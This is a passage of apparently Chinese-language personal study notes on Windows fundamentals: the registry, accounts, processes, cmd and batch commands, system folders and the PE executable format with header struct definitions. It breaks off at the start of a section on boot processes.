class="table-container"><table><thead><tr><th>音乐</th><th>图片</th><th>特性</th></tr></thead><tbody><tr><td>WAV</td><td>BMP</td><td>未压缩，体积大</td></tr><tr><td>FLAC</td><td>PNG</td><td>无损压缩</td></tr><tr><td>MP3</td><td>JPEG</td><td>压缩率高</td></tr><tr><td>WMA/OGG</td><td>webp</td><td>更高</td></tr><tr><td>AAC</td><td>AVIF/HEIF</td><td>最高</td></tr></tbody></table></div><p><strong>环境变量</strong>：简单来说就是告诉计算机，你这个程序在哪里，可以方便操作系统打开这个程序。格式<code>%xxx%</code>包括用户变量和系统变量：</p><ul><li>用户变量指的就是操作系统对于当前用户（多用户）所能够快速操作的程序</li><li>系统变量就是该操作系统（多系统）可以快速打开的程序</li></ul><p><code>dir env:</code>显示所有环境变量；<code>$env:Path</code>显示Path环境变量；<code>$env:Path +=&quot;;C:\xx&quot;</code>添加环境变量（在CLI中仅限当前，关闭后消失）</p><p><strong>注册表</strong>：用来管理计算机的各个软硬件，包括控制面板、任务管理器、时间的改写、系统开机显示等偏向系统方向的内容，记录了用户安装在计算机上的软件和每个程序的相互关联信息，可以说是一种数据库；结构为：根键——项——值；</p><ul><li>根键：最大的文件夹，以HKEY为前缀，全大写</li></ul><div class="table-container"><table><thead><tr><th>根键名称</th><th>内容</th></tr></thead><tbody><tr><td>HKEY_LOCAL_MACHINE</td><td>与机器硬件有关部分</td></tr><tr><td>HKEY_USERS</td><td>包含了所有的用户（xxx1&amp;xxx2）的设置信息</td></tr><tr><td>HKEY_CURRENT_USER</td><td>当前用户的信息，从第二项中单独分离出来的</td></tr><tr><td>HKEY_CLASSES_ROOT</td><td>定义文件扩展名、类型、图标等;从H1\software\classes分离</td></tr><tr><td>HKEY_CURRENT_CONFIG</td><td>相关配置的驱动的加载；从H1\config中分离</td></tr></tbody></table></div><ul><li><p>项：小文件夹，除了大的文件夹都是项</p></li><li><p>值：包括三部分：值的名称—值的类型—值的数据</p></li></ul><div class="table-container"><table><thead><tr><th>值类型</th><th>具体</th></tr></thead><tbody><tr><td>REG_SZ/字符串值</td><td>固定长度字符串</td></tr><tr><td>REG_BINARY二进制值</td><td>多数硬件组成信息存储</td></tr><tr><td>DWORD/QWORD</td><td>数据的表示是4字节长/8字节长，大多驱动参数为DWORD</td></tr><tr><td>REG_MULTI_SZ多字符串值</td><td>含有多个文本值的字符串</td></tr><tr><td>REG_DWORD可扩充字符串值</td><td>解析的变量？</td></tr></tbody></table></div><p><strong>用户账户管理UAC</strong>：</p><p>目前win10以后有如下账户，管理员用户（Ad）、Guest、Default（防止系统引导出错的账户）、WDAGUtility（Defender账户）、自己的账户；</p><blockquote><p>（在专业版中能GUI查看，家庭版命令net user可以进行管理）</p></blockquote><p>用户组则是用于将相同类型的账号进行分类，每组权限不一，且不同组的共享资源是可以相互访问的。默认包括：Administrator组、Users组、Guest组。</p><p>自己的账户，默认处于用户组和管理员组，只有相关操作时才会暂时升到管理员权限</p><p><strong>常见进程</strong>：</p><ul><li>System进程：用于实现页面内存管理的进程，最高优先级。</li><li>csrss：客户端服务子系统(Client/Server Runtime Subsystem)；控制 Windows图形相关子系统</li><li>Lsass：本地安全权限服务；本地安全权限服务控制Windows安全机制。</li><li>Explorer：资源管理器；管理Windows图形Shell,包括开始菜单，任务栏，桌面和文件管理</li><li>Taskmgr：Windows任务管理器；执行Windows的任务。</li><li>Winlogon：Windows登陆进程；Windows用户的登陆程序。  </li><li>Svchost：主机服务程序；标准的动态链接库主机处理服务。</li><li>Services：Windows服务控制；管理Windows服务。   </li></ul><h3 id="命令与批处理脚本"><a href="#命令与批处理脚本" class="headerlink" title="命令与批处理脚本"></a>命令与批处理脚本</h3><p>cmd是windows下模仿DOS操作系统（之前的磁盘操作系统）的程序，但受到windows的限制，即不可能删除windows文件，但在DOS系统下可以；cmd也可以叫做bat，用cmd编写的脚本类似于Linux下的shell脚本，dos或win下的这样批处理脚本后缀.bat或.cmd</p><blockquote><p>这里再另外介绍以下powrshell，部分命令与cmd相同，大部分命令进行更新，更换为更容易理解的动名词短语形式。此外cmd类似于解释器，而powrshell的相当于一门面向对象的语言，借助.net平台（和win集成）可以运行其他许多在.net平台上编写的程序，也可向下兼容cmd的批处理脚本，对应脚本.ps1（使用的语法叫做cmdlet）</p></blockquote><h4 id="运行win-R键"><a href="#运行win-R键" class="headerlink" title="运行win+R键"></a>运行win+R键</h4><p>.cpl : 即Control Panel extension控制面板扩展程序</p><p>.msc ：即Micosoft management Console微软管理控制台</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">winver<span class="literal">-------------------</span>查看windows版本</span><br><span class="line">regedit<span class="literal">------------------</span>打开注册表编辑器</span><br><span class="line">firewall.cpl<span class="literal">-------------</span>防火墙</span><br><span class="line">mstsc<span class="literal">--------------------</span>远程桌面连接</span><br><span class="line">compmgmt.msc<span class="literal">-------------</span>计算机管理</span><br><span class="line">services.msc<span class="literal">-------------</span>服务管理</span><br><span class="line">optionalfeatures<span class="literal">---------</span>可选功能(如Hyper<span class="literal">-V</span>)</span><br><span class="line">appwiz.cpl<span class="literal">---------------</span>卸载更改程序</span><br><span class="line">shutdown<span class="literal">-----------------</span>关机</span><br><span class="line">certmgr.msc<span class="literal">--------------</span>证书管理</span><br><span class="line">control<span class="literal">------------------</span>打开控制面板</span><br><span class="line">appwiz.cpl<span class="literal">---------------</span>卸载部分软件</span><br></pre></td></tr></table></figure><h4 id="cmd基本命令"><a href="#cmd基本命令" class="headerlink" title="cmd基本命令"></a>cmd基本命令</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">help balabala(查询balabala命令的详细用法)</span><br><span class="line"><span class="literal">---------------</span>目录<span class="literal">----------------------------</span></span><br><span class="line"><span class="built_in">cd</span>..(返回上一级)</span><br><span class="line"><span class="built_in">cd</span> \(返回根目录)</span><br><span class="line"><span class="built_in">cd</span> /d d:/test(切换到d盘的test文件夹，/d为参数)</span><br><span class="line"><span class="literal">------------</span>文件相关<span class="literal">----------------------------</span></span><br><span class="line"><span class="built_in">dir</span>(显示当前目录下文件夹)</span><br><span class="line">tree d:/test(树状列出)</span><br><span class="line"><span class="built_in">md</span> test6(建立test6文件夹)</span><br><span class="line"><span class="built_in">rd</span> test6(删除test6文件夹,需确认)  /s(非空时需要确认) /s/q(非空时不需要确认)</span><br><span class="line"><span class="built_in">copy</span>/<span class="built_in">move</span>  d:\test1  e:\test2(把test1文件夹复制/移动到test2文件夹下)</span><br><span class="line"><span class="built_in">del</span> test5.pdf(专门删除文件，不是文件夹，不经常回收站)</span><br><span class="line"><span class="built_in">ren</span> d:\test1  test4(重命名文件/文件夹)</span><br><span class="line">attrib<span class="literal">--------------</span>(设置文件属性)</span><br><span class="line"><span class="literal">------------</span>网络<span class="literal">-------------------------------</span></span><br><span class="line">ping ip/域名(测试连通)   <span class="literal">-n</span> <span class="number">5</span>(测试五次)</span><br><span class="line">tracert ip/域名(路由追踪)</span><br><span class="line">ipconfig(查看本机ip)</span><br><span class="line">arp(用于显示连接在同一网段下的其他IP)</span><br><span class="line"><span class="literal">------------</span>进程<span class="literal">-------------------------------</span></span><br><span class="line">tasklist(显示当前正在运行的进程)</span><br><span class="line"><span class="built_in">start</span> xx.exe(开启某程序)</span><br><span class="line">taskkill /im xxx.exe(按照名称关闭进程)</span><br><span class="line">taskkill /pid <span class="number">123456</span>(按PID关闭进程)</span><br><span class="line"><span class="literal">------------</span>其他<span class="literal">-------------------------------</span></span><br><span class="line">shutdown /s(关机) /<span class="built_in">r</span>(重启) /<span class="built_in">h</span>|f(休眠) /a(取消关机) /s /t <span class="number">100</span>(<span class="number">100</span>s后关机)</span><br><span class="line"><span class="built_in">cls</span>(清屏)</span><br><span class="line">F7(查看所有执行过的命令，左边会有编号)</span><br><span class="line">F9(搭配F7，按照编号选择命令)</span><br></pre></td></tr></table></figure><h4 id="批处理脚本"><a href="#批处理脚本" class="headerlink" title="批处理脚本"></a>批处理脚本</h4><p>后缀文件保存为.bat，双击即可食用；至于脚本，是因为同样类似于解释型语言，一条条翻译运行；</p><p>cmd窗口与python的交互窗口类似；当然下面所列的也可以在cmd窗口中直接运行；可以与正则表达式配合使用</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">-------------条件循环-------</span><br><span class="line"><span class="keyword">if</span> <span class="variable">%a%</span> <span class="keyword">equ</span> <span class="variable">%b%</span> (<span class="built_in">echo</span> yes) <span class="keyword">else</span> (<span class="built_in">echo</span> no)#如果a=b..</span><br><span class="line">#<span class="keyword">exit</span>(存在哪个文件)<span class="keyword">equ</span>(相等);<span class="keyword">neq</span>(不等);<span class="keyword">lss</span>(小于);<span class="keyword">leq</span>(小或等);<span class="keyword">gtr</span>(大于);<span class="keyword">geq</span>(大或等);</span><br><span class="line"><span class="keyword">for</span>  <span class="variable">%%I</span> <span class="keyword">in</span> (ABC) <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">%%I</span>#输出ABC</span><br><span class="line">#<span class="keyword">for</span> %I <span class="keyword">in</span>(内容<span class="number">1</span>，内容<span class="number">2</span>...) <span class="keyword">do</span> command (在bat文件中用<span class="variable">%%I</span>)</span><br><span class="line"></span><br><span class="line">------------显示与变量设置---</span><br><span class="line"><span class="built_in">echo</span> (显示当前回显状态)</span><br><span class="line">@<span class="built_in">echo</span> off (从本行开始关闭回显，去掉@则从下行开始，on则打开，@负责单行的回显，一般作为文件开始)</span><br><span class="line"><span class="built_in">set</span> a=aaa (设置变量a值为“aaa”，不要用%<span class="number">0</span>~<span class="number">9</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">%a%</span> (输出变量a的值)</span><br><span class="line"><span class="comment">rem (注释)</span></span><br><span class="line">%<span class="number">0</span> <span class="variable">%1.....%</span><span class="number">9</span> (第<span class="number">0</span>-<span class="number">9</span>个参数，%<span class="number">0</span>表示自身，指的是在命令行中运行脚本时带的参数)</span><br><span class="line">-------------其他----------</span><br><span class="line"><span class="built_in">title</span> xxx (变更窗口标题)</span><br><span class="line"><span class="built_in">pause</span> (暂停)</span><br><span class="line">&amp;(顺序执行多条命令，不管结果)</span><br><span class="line">&amp;&amp;(顺序执行，碰到错误命令后不再执行)</span><br><span class="line">||(顺序执行命令，碰到正确后不再执行)</span><br><span class="line">|  (管道符，后面的做前面的输入)</span><br><span class="line">&gt;(清除原本内容后再写入)</span><br><span class="line">&gt;&gt;(接着写)</span><br></pre></td></tr></table></figure><blockquote><p>在PS中默认不支持脚本，需要用管理员权限开启，并输入<code>Set-ExecutionPolicy RemoteSigned</code>更改执行策略</p></blockquote><h3 id="系统文件"><a href="#系统文件" class="headerlink" title="系统文件"></a>系统文件</h3><p>ps: $开头的一般均为临时文件；</p><ol><li>Windows：win系统文件</li></ol><ul><li>addins：存放系统附加功能</li><li>appcompat：应用兼容性相关</li><li>apppath：保存程序的修补备份文件</li><li>assembly：由.Net Framwork自动创建，包含多个托管模块以及一些资源文件的逻辑组合；</li><li>boot：主要功能为一键备份所需，可删；另一个boot.ini为系统启动时的引导文件；</li><li>Debug：系统层面的调试文件夹，存放调试日志.log</li><li>Downloaded Program Files：存放过去的IE浏览器扩展，目前已空；可删；</li><li>Help：Windows帮助文件；可扔；</li><li>INF：存放 为硬件提供服务的.inf文件和.pnf文件；</li><li>Microsoft.NET：.net根据官方文档，电脑的驱动以及系统更新需要此支持；</li><li>Offline web pages：脱机浏览文件，即没网的时候仍可浏览的网页；</li><li><strong>PLA</strong>：性能日志和警报，依据性能计数器阈值生成警报等；</li><li>Prefetch：存放系统预读取过的信息，加快访问速率；可删内容；</li><li><strong>security</strong>：系统重要的数据文件；</li><li><strong>System32</strong>：存放64位的windows系统；<ul><li>drivers：里面存放驱动程序文件的可执行代码.sys文件</li></ul></li><li><strong>SysWOW64</strong>：是64位的windows用来存放32位windows的地方；</li><li>TAPI：win升级时备份的旧版本文件；可删；</li><li>TEMP：系统运行过程中的的临时文件夹；需清理；</li><li>Templnst：存储部分应用的离线模板文件夹；</li><li>Tracing：WindowsLiveMassage会创建的文件；现在没啥用；</li><li>twain_32：实现扫描功能，需外接设备；没啥用；</li><li><strong>WinSxS</strong>：存放不同版本的windows组件，减少dll引起的不同版本引用的问题</li></ul><ol><li><p>Program File：系统中64位软件的安装目录</p></li><li><p>Program File(x86)：系统中32位软件安装目录</p></li><li><p>Program Data：放置程序使用数据等</p></li><li><p>Users：存储系统所有用户的软件及数据等；包括桌面和开始菜单</p><ul><li>Default：存放创建新账户时的配置文件</li><li>Lenovo：Lenovo用户的存储的数据内容（这里主要介绍其中AppDate里的内容）<ul><li>Local：与安装的程序相关的文件夹，其中的数据不会因为用户的切换而无法显示</li><li>LocalLow：低级别访问数据</li><li>Roaming：可随着用户的配置而转移的数据</li></ul></li><li>公用：所有用户可用文件夹</li></ul></li><li><p>Intel：安装驱动时的文件夹，安装过后可扔</p></li></ol><blockquote><p> 下面是Windows文件夹下一些主题配置相关文件</p><p>Cursors：鼠标指针，以.cur格式存放。en-US、zh-CN：语言文件夹。</p><p>Fonts：字体文件。IME：存放系统默认的输入法。</p><p>Media：系统提示音等。Resources：系统主题文件。Web：系统自带的图片壁纸</p></blockquote><h3 id="PE文件"><a href="#PE文件" class="headerlink" title="PE文件"></a>PE文件</h3><p>PE（Portable Executable），可移植的可执行文件。由COFF（UNIX下的通用对象文件格式）发展过来，对应Linux下的ELF文件；PE指的32位的可执行文件也叫PE32，对于64位的叫PE+或PE32+是一种扩展形式。因为PE文件在装载时被映射到进程虚拟空间中运行，所以在官网中也称PE为映像文件。</p><p><strong>有关操作</strong>：</p><ul><li><p>与gcc的<code>__attritube__()</code>类似，VC使用<code>#pragma</code>来提示编译器</p></li><li><p>VC的cpp编译器：<code>cl /c /Za hello.c</code>/c表示只编译为.obj文件，/Za则是禁用掉默认扩展，/Zl关闭默认链接库</p></li><li><p>链接器link</p></li><li><p>可执行文件查看器dumpbin：<code>dumpbin [/ALL|/SUMMARY] xx.obj</code>一个看全部信息，一个仅看基本</p></li></ul><p>二进制下打开4D 5A开头对应ASCII码中的MZ，其后面不远就有PE，这些标志着PE文件的叫做PE指纹；整体结构：DOS首部—NT映像头—块表/节表—块/节</p><blockquote><p>详细概述见<a href="https://learn.microsoft.com/zh-cn/windows/win32/debug/pe-format">PE 格式 - Win32 apps | Microsoft Learn</a></p></blockquote><div class="table-container"><table><thead><tr><th>种类</th><th>后缀</th></tr></thead><tbody><tr><td>可执行系列</td><td>.exe  &amp;&amp; .scr</td></tr><tr><td>库系列</td><td>.dll &amp;&amp; .ocx &amp;&amp; .cpl &amp;&amp; .drv</td></tr><tr><td>驱动程序系列</td><td>.sys  &amp;&amp; .vxd</td></tr><tr><td>对象文件系列</td><td>.obj</td></tr></tbody></table></div><p>不同于Linux下目标文件和最终的可执行文件，VC生成的.obj文件与.exe文件格式不太相同，前者采用的是没有PE可选头的COFF格式，后者则是完整的PE格式。COFF格式以<code>IMAGE_FILE_HEADER</code>开头，之后就是段表和段，在PE中该头以<code>IMAGE_NT_HEADER</code>代替，在其前面还添加了DOS头（兼容DOS系统），后面内容基本一致。我们主要介绍PE</p><ul><li><p>DOS部首：DOS MZ(4D 5A)文件头，DOS块共64字节，最低四字节，存放着PE的地址，在DOS MZ和PE头之间剩下的是DOS插桩程序。DOS部首<code>IMAGE_DOS_HEADER</code>中有<code>e_cs</code>和<code>e_ip</code>两个成员来指向上述插桩程序入口地址，当PE在DOS下被执行时，最开始两个字节“MZ”使其误以为是正常的DOS可执行文件，之后读取上述两个成员值，跳转到DOS stub中，该段代码可以在DOS下运行，其唯一作用就是在终端输出“This program cannot be run in DOS”或”This program must be run under Win32”，然后退出。在目前的DOS头中唯一有用的就是其<code>e_lfanew</code>成员，其表明了NT头的偏移位置。</p></li><li><p><strong>PE文件头/NT映像头</strong>：4B+20B+224B；这里以32位做实例，存在于<winnt.h>头文件中，详情参考<a href="https://learn.microsoft.com/zh-cn/windows/win32/api/winnt/ns-winnt-image_nt_headers32">Microsoft Learn</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_NT_HEADERS</span> &#123;</span><br><span class="line">DWORD Signature;<span class="comment">//字串，4B</span></span><br><span class="line">    IMAGE_FILE_HEADER FileHeader;<span class="comment">//映像文件头，20B</span></span><br><span class="line">    IMAGE_OPTIONAL_HEADER32 OptionalHeader;<span class="comment">//可选映像头，224B，64位下240B</span></span><br><span class="line">&#125;IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br></pre></td></tr></table></figure><ol><li><p>字串：”50\45\00\00”=”PE\0\0”标志着NT头的开始；在DOS程序头的3CH位置的四个字节，是前面字符串的偏移地址。</p></li><li><p>映像文件头（main）：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_FILE_HEADER</span>&#123;</span><br><span class="line">WORD Machine<span class="comment">//机器类型,x86=14CH</span></span><br><span class="line">WORD NumberOfSection<span class="comment">//文件中节的个数,important,每个节固定40字节</span></span><br><span class="line">DWORD TimeDateStamp<span class="comment">//文件生成的时间戳</span></span><br><span class="line">DWORD PointerToSymbolTable<span class="comment">//COFF符号表的偏移（用于调试）</span></span><br><span class="line">DWORD NumberOfSymbols<span class="comment">//符号表中的符号数目（用于调试）</span></span><br><span class="line">WORD SizeOfOptionalHeader<span class="comment">//可选头大小,important,用于寻找节表的开始位置</span></span><br><span class="line">WORD Characteristics<span class="comment">//文件属性</span></span><br><span class="line">&#125;IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure></li><li><p>可选映像头：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_OPTIONAL_HEADER</span> &#123;</span><br><span class="line">  WORD Magic;<span class="comment">//幻数，一般是010BH</span></span><br><span class="line">  BYTE MajorLinkerVersion;<span class="comment">//连接程序的主版本号</span></span><br><span class="line">  BYTE MinorLinkerVersion;<span class="comment">//连接程序次版本号</span></span><br><span class="line">  DWORD SizeOfCode;<span class="comment">//代码段总尺寸-important-对齐后的值</span></span><br><span class="line">  DWORD SizeOfInitializedData;<span class="comment">//已初始化数据总尺寸</span></span><br><span class="line">  DWORD SizeOfUninitializedData;<span class="comment">//未初始化数据总尺寸</span></span><br><span class="line">  DWORD AddressOfEntryPoint;<span class="comment">//开始执行位置-important!!!</span></span><br><span class="line">  DWORD BaseOfCode;<span class="comment">//代码节开始位置-important</span></span><br><span class="line">  DWORD BaseOfData;<span class="comment">//数据节开始位置</span></span><br><span class="line">  DWORD ImageBase;<span class="comment">//可执行文件默认装入的基地址-如果装入时用该值做基地址则无需再重定位,EXE默认400000H，DLL默认10000000H</span></span><br><span class="line">  DWORD SectionAlignment;<span class="comment">//装入内存时节的对齐数字</span></span><br><span class="line">  DWORD FileAlignment;<span class="comment">//节的对齐数字，一般是扇区长（512B）</span></span><br><span class="line">  WORD MajorOperatingSystemVersion;<span class="comment">//要求最低的OS主版本号</span></span><br><span class="line">  WORD MinorOperatingSystemVersion;<span class="comment">//最低OS的次版本号</span></span><br><span class="line">  WORD MajorImageVersion;<span class="comment">//可执行文件主版本号</span></span><br><span class="line">  WORD MinorImageVersion;<span class="comment">//次版本号</span></span><br><span class="line">  WORD MajorSubsystemVersion;<span class="comment">//最小子系统主版本号</span></span><br><span class="line">  WORD MinorSubsystemVersion;<span class="comment">//最小子系统次版本号</span></span><br><span class="line">  DWORD Win32VersionValue;<span class="comment">//保留，一般0</span></span><br><span class="line">  DWORD SizeOfImage;<span class="comment">//装入内存后映像的总尺寸-SectionAlignment的整数倍</span></span><br><span class="line">  DWORD SizeOfHeaders;<span class="comment">//NT映像头+节表大小</span></span><br><span class="line">  DWORD CheckSum;<span class="comment">//CRC检验和，一般EXE为0，</span></span><br><span class="line">  WORD Subsystem;<span class="comment">//可执行文件的子系统</span></span><br><span class="line">  WORD DllCharacteristics;<span class="comment">//何时被DllMain调用</span></span><br><span class="line">  DWORD SizeOfStackReserve;<span class="comment">//初始化线程时保留的栈大小</span></span><br><span class="line">  DWORD SizeOfStackCommit;<span class="comment">//提交的栈大小</span></span><br><span class="line">  DWORD SizeOfHeapReserve;<span class="comment">//保留堆大小</span></span><br><span class="line">  DWORD SizeOfHeapCommit;<span class="comment">//提交堆大小</span></span><br><span class="line">  DWORD LoaderFlags;<span class="comment">//与调试有关</span></span><br><span class="line">  DWORD NumberOfRvaAndSizes;<span class="comment">//数据目录的项数，一般16</span></span><br><span class="line">  IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];<span class="comment">//数据目录，存放该可执行文件上一些数据表的起始RVA和尺寸</span></span><br><span class="line">&#125;IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></table></figure><blockquote><p>16个数据表【4B-起始虚拟地址|4B-数据表大小】：<a href="https://learn.microsoft.com/zh-cn/windows/win32/debug/pe-format#optional-header-data-directories-image-only">目录项</a></p><p>关于VA、RVA、FOA等的计算：<a href="https://www.cnblogs.com/zpchcbd/p/12312370.html">RVA和FOA的相互转换 - zpchcbd 博客园</a></p></blockquote></li></ol></li><li><p>节表/块表：用来说明节的具体信息，每个节都有一个节表，节表数量由映像文件头决定；一个节表40B；通俗版参考：<a href="https://www.52pojie.cn/thread-1407996-1-1.html">PE文件笔记六 节表和节</a></p><blockquote><p>VA：内存中虚拟地址；RVA：相对虚拟地址的偏移；FA：文件的地址；FOA：在文件中的偏移地址，没有被载入内存；VA = RVA + ImageBase</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_SECTION_HEADER</span> &#123;</span><br><span class="line">  BYTE  Name[IMAGE_SIZEOF_SHORT_NAME];<span class="comment">//8字节的节名，数组表示</span></span><br><span class="line">  <span class="keyword">union</span> &#123;</span><br><span class="line">    DWORD PhysicalAddress;</span><br><span class="line">    DWORD VirtualSize;</span><br><span class="line">  &#125; Misc;<span class="comment">//obj文件用来表示本节物理地址，EXE文件中表示节的实际字节数</span></span><br><span class="line">  DWORD VirtualAddress;<span class="comment">//加载进内存后，本节的偏移地址地址</span></span><br><span class="line">  DWORD SizeOfRawData;<span class="comment">//未加载的文件在对齐后的节的尺寸</span></span><br><span class="line">  DWORD PointerToRawData;<span class="comment">//本节在原始文件中的偏移地址</span></span><br><span class="line">  DWORD PointerToRelocations;<span class="comment">//obj文件中表示该节重定位信息的偏移，EXE中无意义</span></span><br><span class="line">  DWORD PointerToLinenumbers;<span class="comment">//行号表位置</span></span><br><span class="line">  WORD  NumberOfRelocations;<span class="comment">//需要重定位的数目</span></span><br><span class="line">  WORD  NumberOfLinenumbers;<span class="comment">//在行号表中的行号数目</span></span><br><span class="line">  DWORD Characteristics;<span class="comment">//节属性-代码节=60000020h即可执行、可读、节中包含代码-数据节=C0000040h即可读、可写、包含已初始化数据</span></span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure><p>根据可执行文件获取每一节在内存中位置：</p><ol><li>读取<code>IMAGE_FILE_HEADER.NumberOfSection</code>，获取<strong>节</strong>数目</li><li>读取<code>IMAGE_OPTIONAL_HEADER.SizeOfHeaders</code>来定位<strong>节表</strong>的位置</li><li>对于每一节，首先读取<code>IMAGE_SECTION_HEADER.PointerToRawData</code>来得到该<strong>节</strong>在原始文件中的偏移地址—FOA，读取<code>IMAGE_SECTION_HEADER.SizeOfRawData</code>得到<strong>节</strong>在原始文件中的总字节数</li><li>读取<code>IMAGE_OPTIONAL_HEADER.ImageBase</code>得到<strong>文件</strong>在内存中的基地址—ImageBase，之后读取<code>IMAGE_SECTION_HEADER.VirtualAddress</code>获得本<strong>节</strong>相对于文件的偏移地址—RVA，两者再相加获得本节的虚拟地址—VA，同时根据<code>IMAGE_SECTION_HEADER.Characteristics</code>获取节的具体属性</li></ol></li><li><p>节数据：</p><ol><li><p>代码节.text或.code：PE文件均有，含有程序可执行代码</p></li><li><p>引出函数节.edata：一般在DLL中，本文件向其他文件提供的可调用函数列表。</p></li><li><p>引入函数节.idata：<code>IMAGE_IMPORT_DESCRIPTOR</code>结构数组，每引入一个DLL，数组就多一项，最后一项全0表示结束。</p></li><li><p>已初始化数据节.data：编译时已经固定值的数据</p></li><li><p>未初始化数据节.bss：未初始化的全局变量和静态变量</p></li><li><p>资源节.rsrc或.rdata：程序要用到的资源，树形结构</p></li><li><p><code>.debug$S</code>符号相关的调试信息段；<code>.debug$P</code>预编译头文件调试信息；<code>.debug$T</code>类型相关调试信息</p></li><li><p>.drectve段：区别于GCC下的链接脚本，在VC中编译器通过该段来告诉链接器如何对本目标文件进行链接</p></li><li><p>重定位信息段.reloc：存放重定位信息</p></li></ol></li></ul><h3 id="Win引导"><a href="#Win引导" class="headerlink" title="Win引导"></a>Win引导</h3><p>首先了解各大致过程：电源开启—&gt;分区引导（MBR）—&gt;操作系统引导（NTLDR/Bootmgr）—&gt;文件系统引导（DBR，每个卷/盘/区可以有不同的文件系统）；下面的介绍均以windows为例子</p><p><strong>硬盘结构</strong>：</p><ul><li><p>CHS寻址：借助3D参数，磁头0-255、柱面0-1023、扇区1-63</p><blockquote><p>3D参数：磁头数head（8位）、柱面数/磁道号cylinders（10位）、扇区数sectors（6位，每个扇区512字节）</p></blockquote></li><li><p>Int 13H调用：BIOS提供的基本功能，用于磁盘的复位、读写、校验、定位、诊断、格式化等，使用上述CHS寻址；</p></li><li><p>LBA寻址：将所有的扇区统一编号，从0开始；该地址为线性地址，由地址翻译器（硬件）将前面所述物理地址转换到此；同时也扩展了Int 13H，将其8G的限制突破；常用于下面的UEFI引导</p><blockquote><p>LBA地址=当前柱面号×255×63+当前磁头号×63+（当前扇区数-1）；因为不存在C/H/S=0/0/0，所以最后减一</p></blockquote></li></ul><p>分区与引导：用于对一个或多个真实存在的磁盘进行分区（划分为一个或多个），而每个分区都需要有自己的文件系统用来让OS进行管理，这些文件系统也需要有引导，一般都在开头位置的引导区。分区中也存放着操作系统的引导代码，引导重点在于OS的启动过程。</p><p><strong>Legacy 